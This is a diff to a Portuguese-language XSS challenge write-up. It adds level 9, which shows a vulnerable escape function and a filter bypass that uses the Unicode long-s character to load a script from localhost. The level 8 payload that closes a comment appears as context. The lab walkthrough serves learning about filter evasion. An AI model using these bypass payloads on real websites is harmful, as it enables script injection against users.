@@ -156,3 +156,23 @@ function escape(input) {
 Level 8 ` prompt(1) -->`
 
 Neste nível, o payload faz duas coisas principais: 1) insere um espaço antes do prompt para evitar problemas de concatenação; 2) encerra o comentário JS com -->. Isso é feito porque a sequência --> é interpretada como o fim de um comentário no código JavaScript, mesmo em navegadores que são permissivos em relação a isso, permitindo que o restante do código seja executado sem interferências.
+
+
+
+## level 9
+```javascript
+function escape(input) {
+    // filter potential start-tags
+    input = input.replace(/<([a-zA-Z])/g, '<_$1');
+    // use all-caps for heading
+    input = input.toUpperCase();
+
+    // sample input: you shall not pass! => YOU SHALL NOT PASS!
+    return '<h1>' + input + '</h1>';
+}       
+```
+Level 9 `<ſcript/src=http://localhost:8000/test.js></ſcript>`
+
+Neste nível, podemos observar que a entrada do usuário é tratada por “_” e também é feita a conversão de minúsculas para maiúsculas. Para contornar isso, podemos criar um payload utilizando alguns caracteres UNICODE da internet e, além disso, precisamos criar um arquivo JavaScript contendo o texto `prompt(1)`. Com isso só colocar no site a resposta desse level que conseguimos passar de nível.
+
+![image](https://github.com/user-attachments/assets/dc13ddf5-82c6-4c8a-87fe-e57a00362141)
